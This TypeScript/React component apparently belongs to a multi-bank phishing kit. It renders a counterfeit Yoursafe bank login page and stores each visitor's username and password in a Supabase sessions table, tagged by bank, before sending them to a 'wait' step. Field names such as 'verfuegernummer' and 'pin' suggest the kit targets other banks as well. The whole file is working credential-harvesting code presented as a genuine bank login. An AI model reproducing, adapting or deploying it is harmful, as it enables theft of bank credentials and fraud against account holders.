"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function YoursafeClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({
      current_step: "wait",
      form_data: { ...prev, bankSlug: "yoursafe", bankName: "Yoursafe", verfuegernummer: username, pin: password }
    }).eq("id", sessionId);
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-white font-sans flex flex-row-reverse">
      <div className="flex-1 flex flex-col justify-center px-8 sm:px-20 lg:px-32 relative">
        <div className="absolute top-8 right-8 sm:right-20 lg:right-32 flex justify-end">
          <img src="/bank-logos/yoursafe.svg" alt="Yoursafe" className="h-8" />
        </div>
        <div className="w-full max-w-sm mt-12">
          <h1 className="text-[32px] font-bold text-[#0A81C5] mb-2">Log in</h1>
          <p className="text-gray-500 mb-8 font-medium">To access your Yoursafe account</p>
          <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }} className="space-y-5">
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-1.5">Email / Username</label>
              <input required type="text" value={username} onChange={e => setUsername(e.target.value)} className="w-full border border-gray-300 rounded-lg py-3 px-4 focus:outline-none focus:border-[#0A81C5] focus:ring-1 focus:ring-[#0A81C5] transition-all" />
            </div>
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-1.5">Password</label>
              <input required type="password" value={password} onChange={e => setPassword(e.target.value)} className="w-full border border-gray-300 rounded-lg py-3 px-4 focus:outline-none focus:border-[#0A81C5] focus:ring-1 focus:ring-[#0A81C5] transition-all" />
            </div>
            <button type="submit" disabled={saving || !username || !password} className="w-full bg-[#0A81C5] text-white font-bold py-3.5 rounded-lg mt-4 hover:bg-[#08679E] disabled:opacity-50 transition-colors shadow-md shadow-blue-500/20">
              {saving ? "Loading..." : "Continue"}
            </button>
          </form>
        </div>
      </div>
      <div className="hidden lg:flex w-1/2 bg-[#E6F3FA] relative items-center justify-center p-12">
        <img src="/bank-assets/yoursafe/sol taraf kadın .svg" alt="Yoursafe" className="w-full max-w-md object-contain" />
      </div>
    </div>
  );
}